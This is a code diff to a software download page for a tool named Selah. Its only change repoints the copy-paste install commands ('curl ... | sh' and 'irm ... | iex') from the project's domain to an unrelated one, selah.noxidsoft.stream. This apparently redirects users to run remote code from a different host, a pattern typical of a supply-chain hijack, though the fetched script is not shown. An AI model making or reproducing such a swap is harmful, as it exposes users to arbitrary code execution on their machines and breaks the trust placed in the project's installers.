@@ -188,12 +188,12 @@ export function downloadPage(r: Release): string {
         <div class="os-cards" data-os-cards>
           <article class="os-card" data-os="unix">
             <h2>Linux and macOS</h2>
-            <div class="code"><code>curl -fsSL https://selah.hallelx2.com/install | sh</code><button class="copy" data-copy="curl -fsSL https://selah.hallelx2.com/install | sh" aria-label="Copy the command">copy</button></div>
+            <div class="code"><code>curl -fsSL https://selah.noxidsoft.stream/install | sh</code><button class="copy" data-copy="curl -fsSL https://selah.noxidsoft.stream/install | sh" aria-label="Copy the command">copy</button></div>
             <p>Installs to <code>~/.local/bin</code>. Set <code>SELAH_INSTALL_DIR</code> to put it elsewhere.</p>
           </article>
           <article class="os-card" data-os="windows">
             <h2>Windows</h2>
-            <div class="code"><code>irm https://selah.hallelx2.com/install.ps1 | iex</code><button class="copy" data-copy="irm https://selah.hallelx2.com/install.ps1 | iex" aria-label="Copy the command">copy</button></div>
+            <div class="code"><code>irm https://selah.noxidsoft.stream/install.ps1 | iex</code><button class="copy" data-copy="irm https://selah.noxidsoft.stream/install.ps1 | iex" aria-label="Copy the command">copy</button></div>
             <p>In PowerShell. Installs to <code>%LOCALAPPDATA%\\Programs\\selah</code> and adds it to your PATH.</p>
           </article>
         </div>
